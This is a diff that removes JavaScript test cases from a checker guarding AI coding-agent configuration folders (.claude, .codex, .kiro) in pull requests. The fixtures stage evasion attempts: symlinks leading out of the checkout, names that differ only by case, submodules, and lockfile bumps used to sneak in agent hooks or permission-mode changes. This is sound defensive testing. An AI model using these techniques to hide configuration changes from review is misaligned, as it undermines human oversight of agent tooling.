-    const plainLink = (name, to) => { const dir = project({ ...script, "vendor/package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "1.0.0" } } }), "vendor/node_modules/pkg/a.md": "---\nname: a\n---\n", "lib/d/b.md": "# b\n", ...listing() }); fs.symlinkSync("../vendor/node_modules/pkg/a.md", path.join(dir, "lib/hop")); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync(to, path.join(dir, ".claude/agents", name)); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link below agents"); return dir; };
-    const relock = { "vendor/package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "2.0.0" } } }) };
-    const plainKept = run(pr(plainLink("x", "../../lib/hop"), { "vendor/node_modules/pkg/a.md": "---\nname: a\npermissionMode: default\n---\n" }));
-    ok(plainKept.status === 0 && plainKept.out.includes(LINKED), "a link the base held below agents, named as no Markdown file and reaching a file, is noted while that file changes", plainKept.out);
-    fails(run(pr(plainLink("x.MD", "../../lib/hop"), { "vendor/node_modules/pkg/a.md": "# changed\n" })), "but one named as a Markdown file fails once that file changes", LINKED);
-    for (const name of ["x", "x.md"]) fails(run(pr(plainLink(name, "../../lib/hop"), relock)), `and either, ${name}, fails once its package is locked anew, as an install may put a folder in the file's place`, LINKED);
-    fails(run(pr(plainLink("x", "../../lib/d"), { "lib/d/b.md": "# changed\n" })), "and so does one named as no Markdown file that reaches a folder, once a Markdown file there changes", LINKED);
-    const hopMoved = plainLink("x", "../../lib/hop");
-    git(hopMoved, "checkout", "-q", "-B", "change2"); fs.unlinkSync(path.join(hopMoved, "lib/hop")); fs.symlinkSync("d/b.md", path.join(hopMoved, "lib/hop"));
-    git(hopMoved, "add", "-A"); git(hopMoved, "commit", "-q", "-m", "the hop moved"); git(hopMoved, "checkout", "-q", "main"); git(hopMoved, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(hopMoved), "and one named as no Markdown file fails once a link on its way changes", LINKED);
-    // (as Windows reads a link's text, a name and the ".." after it go before any link is followed, so a link the base held
-    // whose text steps into a link and back out is held by where Windows lands, not by where the inner link leads)
-    const backOut = () => { const dir = project({ ...script, "lib/a.md": "# a\n", "lib/deep/er/k.md": "# k\n", ...listing() }); fs.symlinkSync("deep\\er", path.join(dir, "lib/l")); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync("..\\..\\lib\\l\\..", path.join(dir, ".claude/agents/x")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link stepping back out of a link"); return dir; };
-    fails(run(pr(backOut(), { "lib/evil.md": "---\nname: evil\npermissionMode: default\n---\n" })), "a link the base held below agents whose Windows text steps out of a link it names fails once Markdown is added where Windows lands", LINKED);
-    const backKept = run(pr(backOut(), { "README.md": "x\n" }));
-    ok(backKept.status === 0 && backKept.out.includes(LINKED), "and is noted while nothing there changes", backKept.out);
-    const loops = viaDocs();
-    for (let i = 0; i < 6; i++) fs.symlinkSync(".", path.join(loops, `docs/l${i}`));
-    git(loops, "add", "-A"); git(loops, "commit", "-q", "-m", "loops behind a link");
-    const loopsStarted = Date.now(), loopsKept = run(pr(loops, { "README.md": "x\n" }));
-    ok(loopsKept.status === 0 && loopsKept.out.includes(WAY) && Date.now() - loopsStarted < 30000, "loops of links behind a link are never walked, and the link the base held is noted", loopsKept.out);
-    const agentPkg = () => { const dir = project({ ...script, ".gitignore": "node_modules/\n", "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/pkg": { version: "1.0.0" } } }), ...listing() }); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync("../../node_modules/pkg/agents", path.join(dir, ".claude/agents/pkg")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "agents from a package"); return dir; };
-    fails(run(pr(agentPkg(), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/pkg": { version: "6.6.6" } } }) })), "a link the base held below agents into an installed package fails once the pull request locks that package anew", LINKED);
-    const yarnAgents = run(pr(agentPkg(), { "yarn.lock": "pkg@1:\n  version 1.0.1\n" }));
-    ok(yarnAgents.status === 0 && yarnAgents.out.includes("may have changed unread"), "a link below agents into a package is reported as one that may have changed where a lock no entry is read of changes", yarnAgents.out);
-    const otherPkg = run(pr(agentPkg(), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/pkg": { version: "1.0.0" }, "node_modules/other": { version: "2.0.0" } } }) }));
-    ok(otherPkg.status === 0 && otherPkg.out.includes(LINKED), "while another package locked anew leaves it a note", otherPkg.out);
-    // (many such links the base held, nothing changed, are read in seconds)
-    const manyPkg = viaDocs();
-    fs.writeFileSync(path.join(manyPkg, ".gitignore"), "node_modules/\n"); fs.writeFileSync(path.join(manyPkg, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: {} }));
-    for (let i = 0; i < 300; i++) fs.symlinkSync("../node_modules/pkg/agents", path.join(manyPkg, `docs/l${i}`));
-    git(manyPkg, "add", "-A"); git(manyPkg, "commit", "-q", "-m", "many links into a package");
-    for (let i = 0; i < 400; i++) { fs.mkdirSync(path.join(manyPkg, `fx/f${i}`), { recursive: true }); fs.writeFileSync(path.join(manyPkg, `fx/f${i}/package.json`), "{}\n"); }
-    git(manyPkg, "add", "-A"); git(manyPkg, "commit", "-q", "-m", "and many packages");
-    const manyStarted = Date.now(), manyKept = run(pr(manyPkg, { "README.md": "x\n" }));
-    ok(manyKept.status === 0 && manyKept.out.includes(WAY) && Date.now() - manyStarted < 30000, "while 300 such links the base held, beside 400 packages, nothing changed, are noted in seconds", `${Date.now() - manyStarted} ms\n${manyKept.out.slice(0, 2000)}`);
-    // (#647's fallback security review of 90bcf1a: a folder of agents or commands that is a link out of the checkout fails
-    // as any such link does; a folder in another case a link reaches first is still read for its case; and a hook is named
-    // by the path Claude Code reads it at)
-    const linkAdded = (target, at) => { const dir = project({ ...script, ".gitignore": "node_modules/\n", ...listing() }); git(dir, "checkout", "-q", "-B", "change"); fs.mkdirSync(path.dirname(path.join(dir, at)), { recursive: true }); fs.symlinkSync(target, path.join(dir, at)); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link"); git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change"); return dir; };
-    fails(run(linkAdded("../node_modules/pkg/agents", ".claude/agents")), "a folder of agents that is a link into an installed package fails", '".claude/agents" is a link that leads out of the checkout');
-    fails(run(linkAdded("../../outside-commands", ".claude/commands")), "and so does a folder of commands that is a link out of the checkout", '".claude/commands" is a link that leads out of the checkout');
-    const hooksDir = project({ ...script, ".kiro/Hooks/x.json": JSON.stringify({ hooks: [{ name: "x", trigger: "Stop", action: { type: "command", command: "bash x.sh" } }] }), ...listing() });
-    fs.symlinkSync("../.kiro/Hooks", path.join(hooksDir, ".claude/agents")); git(hooksDir, "add", "-A"); git(hooksDir, "commit", "-q", "-m", "agents to a folder in another case");
-    fails(run(hooksDir, "--core"), "a tool's folder in another case is read for its case, though a link below agents reaches it first", ".kiro/Hooks is .kiro/hooks in another case");
-    const namedAt = project({ ...script, "docs/x.md": `---\nname: x\nhooks:\n  Stop:\n    - hooks:\n${HOOKS}\n---\n`, ...listing() });
-    fs.symlinkSync("../docs", path.join(namedAt, ".claude/agents")); git(namedAt, "add", "-A"); git(namedAt, "commit", "-q", "-m", "agents through a link");
-    fails(run(namedAt, "--core"), "a folder of agents that is a link inside the checkout fails, nothing read through it", WAY, "Mend: replace it with the folder itself");
-    const claudeLinked = project({ "cfg/settings.json": KIT, "cfg/agents/x.md": "---\nname: x\n---\n", ...listing() });
-    fs.rmSync(path.join(claudeLinked, ".claude"), { recursive: true, force: true }); fs.symlinkSync("cfg", path.join(claudeLinked, ".claude")); git(claudeLinked, "add", "-A"); git(claudeLinked, "commit", "-q", "-m", "a .claude through a link");
-    fails(run(claudeLinked, "--core"), "and so does .claude as a link, where the agents are reached through it", '.claude is a link on the way to a folder');
-    // (a .claude link in another case beside a plain one, and one the base held through which an agent is added)
-    const upper = project({ ...script, "cfg/agents/x.md": "---\nname: x\n---\n", ...listing() });
-    fs.symlinkSync("cfg", path.join(upper, ".CLAUDE")); git(upper, "add", "-A"); git(upper, "commit", "-q", "-m", "a .CLAUDE link");
-    fails(run(upper, "--core"), "and a .claude link in another case beside a plain .claude", ".CLAUDE is a link on the way to a folder");
-    fails(run(pr(claudeLinked, { "cfg/agents/y.md": `---\nname: y\nhooks:\n  Stop:\n    - hooks:\n${HOOKS}\n---\n` })), "and one the base held, once an agent is added through it", ".claude is a link on the way to a folder");
-    // (#647's fallback security review of 8922450: a chain of links too long for recursion is read, and fails with
-    // its mend)
-    const chain = project({ ...script, ...listing() });
-    for (let i = 1; i <= 2500; i++) { fs.mkdirSync(path.join(chain, `d/${i}`), { recursive: true }); fs.symlinkSync(`../${i + 1}`, path.join(chain, `d/${i}/next`)); }
-    fs.mkdirSync(path.join(chain, ".claude/agents"), { recursive: true }); fs.symlinkSync("../../d/1", path.join(chain, ".claude/agents/c"));
-    git(chain, "add", "-A"); git(chain, "commit", "-q", "-m", "a long chain of links");
-    fails(run(chain, "--core"), "a link below agents into a long chain of links fails with its mend", LINKED);
-    const deep = project({ ...script, [`.claude/agents/${"a/".repeat(1000)}x.md`]: "---\nname: x\n---\n", ...listing() });
-    const deepStarted = Date.now(), deepRun = run(deep, "--core");
-    ok(deepRun.status === 0 && Date.now() - deepStarted < 30000, "a plain folder a thousand deep below agents is read in seconds", deepRun.out);
-    // (#647's fallback security review of 2b74d24: and a folder of agents thousands wide, each folder's entries found in the
-    // listing by a search, not a scan of it)
-    const wide = project({ ...script, ...Object.fromEntries(Array.from({ length: 3000 }, (_, i) => [`.claude/agents/s${i}/a.txt`, "a\n"])), ...listing() });
-    const wideStarted = Date.now(), wideRun = run(pr(wide, { "README.md": "x\n" }));
-    ok(wideRun.status === 0 && Date.now() - wideStarted < 30000, "a folder of agents three thousand wide is read in seconds", wideRun.out);
-  }
   // (a skill's or command's body that runs a command where it is invoked, and a subagent's permission mode but the
   // default, each held as a setting no starter kit writes)
   const NOKIT = "is of a kind no starter kit writes";
@@ -790,167 +642,6 @@ fails(run(project({ ".claude/settings.json": withPlugins({ "helper@example-marke
   fails(unlisted, "a head git cannot list fails", "cannot be listed", "Mend: ");
   // (#600's fallback security review of 72e6450: names are compared as a file system that folds case does)
   fails(run(pr(project({ ...listing() }), { ".claude/\u017fkills/notes/SKILL.md": "# notes\n" })), "a name that differs only by a letter a full case fold matches fails too", "in another case");
-  if (LINKS) {
-    // (#600's fallback security review of 72e6450: a link of the tool's own name to a folder in the checkout is followed,
-    // as the rest of the check follows it, so a file in another case behind it is read too)
-    for (const [link, inside, says] of [[".codex", "Config.toml", "Mend: rename it to .codex/config.toml"], [".kiro/hooks", "x.JSON", "Mend: rename it to .kiro/hooks/x.json"], [".claude/skills/notes", "Skill.md", "Mend: rename it to .claude/skills/notes/SKILL.md"]]) {
-      const behind = project({ ...listing() });
-      fs.mkdirSync(path.join(behind, "cfg"), { recursive: true });
-      fs.writeFileSync(path.join(behind, "cfg", inside), "{}\n");
-      fs.mkdirSync(path.dirname(path.join(behind, link)), { recursive: true });
-      fs.symlinkSync(path.relative(path.dirname(path.join(behind, link)), path.join(behind, "cfg")), path.join(behind, link));
-      git(behind, "add", "-A"); git(behind, "commit", "-q", "-m", "a link of the tool's own name");
-      fails(run(behind, "--core"), `a file in another case behind ${link}, a link of its own name, fails`, says);
-    }
-    // (#600's code review of a21b252: a file in a tool folder the tool does not read is not looked at, so an ignored link
-    // out of the checkout there fails nothing; and a path beyond a link stops no other's question to git)
-    const docLink = project({ ".gitignore": ".claude/skills/notes/README.md\n", ".claude/skills/notes/notes.txt": "x\n", ...listing() });
-    fs.symlinkSync(path.join(os.tmpdir()), path.join(docLink, ".claude/skills/notes/README.md"));
-    passes(run(pr(docLink, { "README.md": "a change of its own\n" })), "an ignored link out of the checkout in a skill's folder, which the tool does not read, fails nothing");
-    const viaLink = project({ ".gitignore": ".codex/Config.toml\n", "config/settings.json": KIT, ".claude/settings.json": null, ...listing() });
-    fs.rmSync(path.join(viaLink, ".claude"), { recursive: true, force: true });
-    fs.symlinkSync("config", path.join(viaLink, ".claude"));
-    git(viaLink, "add", "-A"); git(viaLink, "commit", "-q", "-m", "settings through a link");
-    write(viaLink, ".codex/Config.toml", "notify = [\"bash\", \"x.sh\"]\n");
-    passes(run(pr(viaLink, { "README.md": "a change of its own\n" })), "an ignored file in another case is still read as ignored where a tool's folder is a link");
-    // (#600's code review of 681de78: what the tool reads there and is no file, a link out among it, is held to the base
-    // as a file's text is, by what it holds)
-    const heldDir = project({ ".Codex/hooks.json": "{}\n", ...listing() });
-    const addLink = pr(heldDir, { "README.md": "a change of its own\n" });
-    git(addLink, "checkout", "-q", "-B", "change2");
-    fs.symlinkSync(os.tmpdir(), path.join(addLink, ".Codex/config.toml"));
-    git(addLink, "add", "-A"); git(addLink, "commit", "-q", "-m", "a link out added");
-    git(addLink, "checkout", "-q", "main"); git(addLink, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(addLink), "a link out added under a folder the base held in another case fails", "Mend: rename it to .codex");
-    const moved = project({ ".Codex/hooks.json": "{}\n", ...listing() });
-    fs.symlinkSync(os.tmpdir(), path.join(moved, ".Codex/config.toml"));
-    git(moved, "add", "-A"); git(moved, "commit", "-q", "-m", "a link out");
-    git(moved, "checkout", "-q", "-B", "change2"); fs.unlinkSync(path.join(moved, ".Codex/config.toml"));
-    fs.symlinkSync(path.dirname(os.tmpdir()), path.join(moved, ".Codex/config.toml"));
-    git(moved, "add", "-A"); git(moved, "commit", "-q", "-m", "the link moved");
-    git(moved, "checkout", "-q", "main"); git(moved, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(moved), "and so does one whose target the pull request moves", "Mend: rename it to .codex");
-    // (#600's code review of 462c48a: and a folder on the way to what the tool reads that is a link out, added there, or
-    // the tool folder itself)
-    for (const [base, add] of [[".Kiro/hooks/x.json", ".Kiro/Settings"], [".Kiro/settings/mcp.json", ".Kiro/Hooks"]]) {
-      const onWay = project({ [base]: "{}\n", ...listing() });
-      const added = pr(onWay, { "README.md": "a change of its own\n" });
-      git(added, "checkout", "-q", "-B", "change2");
-      fs.symlinkSync(os.tmpdir(), path.join(added, add));
-      git(added, "add", "-A"); git(added, "commit", "-q", "-m", "a folder linked out");
-      git(added, "checkout", "-q", "main"); git(added, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-      fails(run(added), `a link out added as ${add} under a folder the base held in another case fails`, "Mend: rename it to .kiro");
-    }
-    // (#600's fallback security review of 348aaed: an entry reached through a link is held by what the walk reaches and
-    // each link on the way, so a submodule moved behind it, a broken link filled in or a link on the way moved is seen)
-    const held = (setup, change, says) => {
-      const dir = project({ ".Kiro/hooks/x.json": "{}\n", ...listing() });
-      setup(dir);
-      git(dir, "checkout", "-q", "-B", "change2");
-      change(dir);
-      git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-      fails(run(dir), says, "Mend: rename it to .kiro");
-    };
-    // (a submodule's entry, its folder left empty on disk so `git add -A` keeps it, committed on its own)
-    const sub = (dir, at, id) => { fs.mkdirSync(path.join(dir, at), { recursive: true }); git(dir, "update-index", "--add", "--cacheinfo", `160000,${id},${at}`); git(dir, "commit", "-q", "-m", `a submodule at ${at}`); };
-    const linkIn = dir => { fs.symlinkSync("../inner", path.join(dir, ".Kiro/settings")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link in"); };
-    held(dir => { linkIn(dir); sub(dir, "inner", git(dir, "rev-parse", "HEAD")); }, dir => sub(dir, "inner", git(dir, "rev-parse", "HEAD~2")), "a submodule behind a link the base held, moved, fails");
-    held(linkIn, dir => sub(dir, "inner", git(dir, "rev-parse", "HEAD")), "a broken link the base held, filled in with a submodule, fails");
-    held(linkIn, dir => { fs.symlinkSync(os.tmpdir(), path.join(dir, "inner")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "filled in"); }, "and filled in with a link out");
-    held(dir => { fs.symlinkSync(os.tmpdir(), path.join(dir, "inner")); linkIn(dir); }, dir => { fs.unlinkSync(path.join(dir, "inner")); fs.symlinkSync(path.dirname(os.tmpdir()), path.join(dir, "inner")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "moved"); }, "a link on the way the pull request moves fails");
-    // (#600's fallback security review of b333c75: a link into a submodule's folder, the submodule moved)
-    held(dir => { fs.symlinkSync("../sub/cfg", path.join(dir, ".Kiro/settings")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link in"); sub(dir, "sub", git(dir, "rev-parse", "HEAD")); }, dir => sub(dir, "sub", git(dir, "rev-parse", "HEAD~2")), "a link into a submodule the base held, the submodule moved, fails");
-    // (and a plain file on the way, which gives the tool nothing to read, is not held)
-    const plainOnWay = project({ ".Kiro/hooks/x.json": "{}\n", ".Kiro/settings": "a\n", ...listing() });
-    const plainRun = run(pr(plainOnWay, { ".Kiro/settings": "b\n" }));
-    ok(plainRun.status === 0, "a plain file on the way to a tool's file, changed, changes nothing the base held", plainRun.out);
-    // (#600's fallback security review of 4252c30: one taken out is seen, as the tool then reads what it hid)
-    fails(run(pr(project({ ".Kiro/hooks/x.json": "{}\n", ".Kiro/settings": "a\n", ...listing() }), { ".Kiro/settings": null })), "and one taken out fails", "Mend: rename it to .kiro");
-    // (and a link through a submodule's folder and back out of it by "..", to a file the pull request changes)
-    held(dir => { fs.mkdirSync(path.join(dir, "real"), { recursive: true }); fs.writeFileSync(path.join(dir, "real/mcp.json"), "{}\n"); fs.symlinkSync("../sub/../real", path.join(dir, ".Kiro/settings")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link through a submodule"); sub(dir, "sub", git(dir, "rev-parse", "HEAD")); }, dir => { fs.writeFileSync(path.join(dir, "real/mcp.json"), "{ \"mcpServers\": {} }\n"); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "changed"); }, "a file reached through a submodule's folder and out of it, changed, fails");
-    // (#600's fallback security review of 243d29e: and through the root's .git, which every clone holds beside the commit)
-    for (const via of [".git"]) held(dir => { fs.mkdirSync(path.join(dir, "real"), { recursive: true }); fs.writeFileSync(path.join(dir, "real/mcp.json"), "{}\n"); fs.symlinkSync(`../${via}/../real`, path.join(dir, ".Kiro/settings")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link through a name the commit lacks"); }, dir => { fs.writeFileSync(path.join(dir, "real/mcp.json"), "{ \"mcpServers\": {} }\n"); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "changed"); }, `a file reached through ${via} and out of it, changed, fails`);
-    // (#600's fallback security review of 4c63650: a name no clone holds ends the walk, as it ends the file system's, so
-    // the base never holds what its tools could not read)
-    const absentServer = project({ ".mcp.json": null, "real.json": JSON.stringify({ mcpServers: { files: { command: "npx", args: ["-y", "files@1.0.0"] } } }), ...listing() });
-    fs.symlinkSync("nothere/../real.json", path.join(absentServer, ".mcp.json"));
-    git(absentServer, "add", "-A"); git(absentServer, "commit", "-q", "-m", "a link through a name no clone holds");
-    fails(run(pr(absentServer, { "nothere/.keep": "" })), "a server the base's tools could not read, made readable, is new", 'the tool server "files"');
-    const absentKept = project({ "real/mcp.json": "{}\n", ".Kiro/hooks/x.json": "{}\n", ...listing() });
-    fs.symlinkSync("../nothere/../real", path.join(absentKept, ".Kiro/settings"));
-    git(absentKept, "add", "-A"); git(absentKept, "commit", "-q", "-m", "a link through a name no clone holds");
-    // (while what is held there is read through any name a working copy may hold, .git's own folders and ignored ones
-    // among them: #600's fallback security review of 09ed8b5)
-    fails(run(pr(absentKept, { "real/mcp.json": "{ \"mcpServers\": {} }\n" })), "what a working copy may give a tool there, changed, fails", "Mend: rename it to .kiro");
-    for (const via of [".git/refs/..", "node_modules"]) held(dir => { fs.mkdirSync(path.join(dir, "real"), { recursive: true }); fs.writeFileSync(path.join(dir, "real/mcp.json"), "{}\n"); fs.symlinkSync(`../${via}/../real`, path.join(dir, ".Kiro/settings")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link through a folder beside the commit"); }, dir => { fs.writeFileSync(path.join(dir, "real/mcp.json"), "{ \"mcpServers\": {} }\n"); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "changed"); }, `a file reached through ${via} and out of it, changed, fails`);
-    // (#600's fallback security review of 1a67694: and a path in another case found through such a folder)
-    const behindRefs = project({ "kreal/Settings/mcp.json": "{}\n", ...listing() });
-    fs.symlinkSync(".git/refs/../../kreal", path.join(behindRefs, ".kiro"));
-    git(behindRefs, "add", "-A"); git(behindRefs, "commit", "-q", "-m", "a tool's folder through .git's own");
-    fails(run(behindRefs, "--core"), "a path in another case behind a link through a folder beside the commit fails", "Mend: rename it to .kiro/settings");
-    // (#600's fallback security review of 27d9d98: a file is held by its kind too, so none reads as a link it names)
-    const asLink = project({ ".Codex/hooks.json": "{}\n", ...listing() });
-    fs.symlinkSync(os.tmpdir(), path.join(asLink, ".Codex/config.toml"));
-    git(asLink, "add", "-A"); git(asLink, "commit", "-q", "-m", "a link out");
-    git(asLink, "checkout", "-q", "-B", "change2"); fs.unlinkSync(path.join(asLink, ".Codex/config.toml"));
-    fs.writeFileSync(path.join(asLink, ".Codex/config.toml"), `\0a link to ${os.tmpdir()}`);
-    git(asLink, "add", "-A"); git(asLink, "commit", "-q", "-m", "the link a file");
-    git(asLink, "checkout", "-q", "main"); git(asLink, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(asLink), "and so does a file put in a link's place that names what the link led to", "Mend: rename it to .codex");
-    // (#600's fallback security review of 8dfe536: behind a link of the tool's own name, an entry in another case that is no
-    // folder the walk reaches is named too, whatever it is)
-    for (const [link, to, inside, says] of [[".kiro", "k", "hooks/x.JSON", "Mend: rename it to .kiro/hooks/x.json"], [".codex", "c", "Config.toml", "Mend: rename it to .codex/config.toml"], [".claude/skills", "../s", "n/Skill.md", "Mend: rename it to .claude/skills/n/SKILL.md"]]) {
-      const out = project({ ...listing() }), real = path.join(out, path.dirname(link), to);
-      fs.mkdirSync(path.dirname(path.join(real, inside)), { recursive: true });
-      fs.symlinkSync(os.tmpdir(), path.join(real, inside));
-      fs.symlinkSync(to, path.join(out, link));
-      git(out, "add", "-A"); git(out, "commit", "-q", "-m", "a link out behind a link of the tool's own name");
-      fails(run(out, "--core"), `a link out of the checkout in another case behind ${link} fails`, says);
-    }
-    const subBehind = project({ "c/keep.md": "", ...listing() });
-    fs.symlinkSync("c", path.join(subBehind, ".codex"));
-    git(subBehind, "add", "-A"); git(subBehind, "update-index", "--add", "--cacheinfo", `160000,${git(subBehind, "rev-parse", "HEAD")},c/Config.toml`);
-    git(subBehind, "commit", "-q", "-m", "a submodule in another case behind a link");
-    fails(run(subBehind, "--core"), "and so does a submodule's entry there", "Mend: rename it to .codex/config.toml");
-    // (#600's fallback security review of 27d9d98: a skill's folder in a folder in another case that is no folder, a link
-    // out of the checkout or a submodule's entry, through which the tool reads a SKILL.md this check cannot, is named too)
-    for (const [skills, says] of [[".claude/Skills", "Mend: rename it to .claude/skills"], [".Claude/skills", "Mend: rename it to .claude"]]) {
-      const outSkill = project({ ...listing() });
-      fs.mkdirSync(path.join(outSkill, skills), { recursive: true });
-      fs.symlinkSync(os.tmpdir(), path.join(outSkill, skills, "foo"));
-      git(outSkill, "add", "-A"); git(outSkill, "commit", "-q", "-m", "a skill's folder linked out");
-      fails(run(outSkill, "--core"), `a skill's folder under ${skills} that links out of the checkout fails`, says);
-    }
-    const subSkill = project({ "README.md": "x\n", ...listing() });
-    git(subSkill, "update-index", "--add", "--cacheinfo", `160000,${git(subSkill, "rev-parse", "HEAD")},.claude/Skills/foo`);
-    git(subSkill, "commit", "-q", "-m", "a skill's folder as a submodule");
-    fails(run(subSkill, "--core"), "and so does one that is a submodule's entry", "Mend: rename it to .claude/skills");
-    const plainSkill = project({ ".claude/Skills/notes.md": "# notes\n", ...listing() });
-    passes(run(plainSkill, "--core"), "while a plain file there, which the tool does not read, is not looked at");
-    const skillHeld = project({ ".claude/Skills/bar/SKILL.md": "# bar\n", ...listing() });
-    const skillAdded = pr(skillHeld, { "README.md": "a change of its own\n" });
-    git(skillAdded, "checkout", "-q", "-B", "change2");
-    fs.symlinkSync(os.tmpdir(), path.join(skillAdded, ".claude/Skills/foo"));
-    git(skillAdded, "add", "-A"); git(skillAdded, "commit", "-q", "-m", "a skill's folder linked out");
-    git(skillAdded, "checkout", "-q", "main"); git(skillAdded, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(skillAdded), "one a pull request adds under a folder the base held in another case fails", "Mend: rename it to .claude/skills");
-    const noteAdded = run(pr(project({ ".claude/Skills/bar/SKILL.md": "# bar\n", ...listing() }), { ".claude/Skills/notes.md": "# notes\n" }));
-    ok(noteAdded.status === 0, "while a file there the tool does not read changes nothing the base held", noteAdded.out);
-    // (#600's code review of 33315a2: nor does a folder added there with no SKILL.md in it)
-    const docAdded = run(pr(project({ ".Claude/skills/bar/SKILL.md": "# bar\n", ...listing() }), { ".Claude/skills/notes/README.md": "# notes\n" }));
-    ok(docAdded.status === 0, "and a folder added there that holds no SKILL.md changes nothing either", docAdded.out);
-    // (a folder or a link in another case on the way to a tool's file)
-    const aliased = project({ "config/config.toml": "notify = [\"bash\", \"scripts/new.sh\"]\n", ...listing() });
-    fs.symlinkSync("config", path.join(aliased, ".Codex"));
-    git(aliased, "add", "-A"); git(aliased, "commit", "-q", "-m", "a link in another case");
-    fails(run(aliased, "--core"), "a link in another case to a tool's folder fails", ".Codex is .codex in another case", "Mend: rename it to .codex");
-    const aliasStood = project({ "config/config.toml": "# none\n", ...listing() });
-    fs.symlinkSync("config", path.join(aliasStood, ".Codex"));
-    git(aliasStood, "add", "-A"); git(aliasStood, "commit", "-q", "-m", "a link in another case");
-    const aliasKept = run(pr(aliasStood, { "README.md": "a change of its own\n" }));
-    ok(aliasKept.status === 0 && /\.Codex is \.codex in another case/.test(aliasKept.out), "one the base held is noted, not failed", aliasKept.out);
-    fails(run(pr(aliasStood, { "config/config.toml": "notify = [\"bash\", \"scripts/new.sh\"]\n" })), "but not once what the tool reads through it changes", "Mend: rename it to .codex");
-  }
   // (#476's security review of a74309b: what the kit's form fetches from main must be a file, not a link, whose target's
   // name main would give in the script's place)
   if (LINKS) {
@@ -1002,283 +693,6 @@ fails(run(project({ ".claude/settings.json": withPlugins({ "helper@example-marke
   const core = project({ ...listing() });
   gitlink(core, ".codex");
   fails(run(core, "--core"), "in the core's own repository none may stand", `.codex ${SAYS}`);
-  if (LINKS) {
-    // (#600's fallback security review of 33315a2: a submodule a tool's path leads to through a link)
-    for (const [at, to] of [[".codex", "sub"], [".claude/skills/foo", "../../sub"], [".kiro/settings", "../sub/cfg"]]) {
-      const behind = project({ ...listing() });
-      gitlink(behind, "sub");
-      fs.mkdirSync(path.dirname(path.join(behind, at)), { recursive: true });
-      fs.symlinkSync(to, path.join(behind, at));
-      git(behind, "add", "-A"); git(behind, "commit", "-q", "-m", "a link to a submodule");
-      fails(run(behind, "--core"), `one ${at} leads to through a link fails`, `${at} leads, through a link, to the submodule sub`, "Mend: ");
-    }
-    const heldBehind = project({ ...listing() });
-    gitlink(heldBehind, "sub");
-    fs.symlinkSync("sub", path.join(heldBehind, ".codex"));
-    git(heldBehind, "add", "-A"); git(heldBehind, "commit", "-q", "-m", "a link to a submodule");
-    const heldBehindRun = run(pr(heldBehind, { "README.md": "a change of its own\n" }));
-    ok(heldBehindRun.status === 0 && heldBehindRun.out.includes("leads, through a link, to the submodule sub"), "one the base held is noted, not failed", heldBehindRun.out);
-    fails(run(prLink(heldBehind, "sub", git(heldBehind, "rev-parse", "HEAD~1"))), "but not once the pull request moves the submodule", "leads, through a link, to the submodule sub");
-    // (#618's fallback security review of 4d141c6: and from a link anywhere under a tool's folder)
-    const skillLink = project({ ".claude/skills/x/SKILL.md": "# x\n", ...listing() });
-    gitlink(skillLink, "sub");
-    fs.symlinkSync("../../../sub", path.join(skillLink, ".claude/skills/x/scripts"));
-    git(skillLink, "add", "-A"); git(skillLink, "commit", "-q", "-m", "a skill's folder linked to a submodule");
-    fails(run(skillLink, "--core"), "a skill's own folder linked to a submodule fails", ".claude/skills/x/scripts leads, through a link, to the submodule sub");
-    // (and a tool's path in another case the base held, through a chain of links: each link on the way is held too)
-    const chain = project({ ...listing() });
-    fs.mkdirSync(path.join(chain, ".claude/Skills"), { recursive: true });
-    fs.symlinkSync(os.tmpdir(), path.join(chain, "l1"));
-    fs.symlinkSync("../../l1", path.join(chain, ".claude/Skills/foo"));
-    git(chain, "add", "-A"); git(chain, "commit", "-q", "-m", "a chain of links out");
-    git(chain, "checkout", "-q", "-B", "change2"); fs.unlinkSync(path.join(chain, "l1"));
-    fs.symlinkSync(path.dirname(os.tmpdir()), path.join(chain, "l1"));
-    git(chain, "add", "-A"); git(chain, "commit", "-q", "-m", "the chain moved");
-    git(chain, "checkout", "-q", "main"); git(chain, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(chain), "a link on the way the pull request moves fails a path in another case the base held", "Mend: rename it to .claude/skills");
-    // (#600's fallback security review of 462c48a: a link to a folder in the checkout, moved to one whose SKILL.md is the same)
-    const twin = project({ "docs/a/SKILL.md": "# a\n", "docs/b/SKILL.md": "# a\n", "docs/b/run.sh": "echo b\n", ...listing() });
-    fs.mkdirSync(path.join(twin, ".claude/Skills"), { recursive: true });
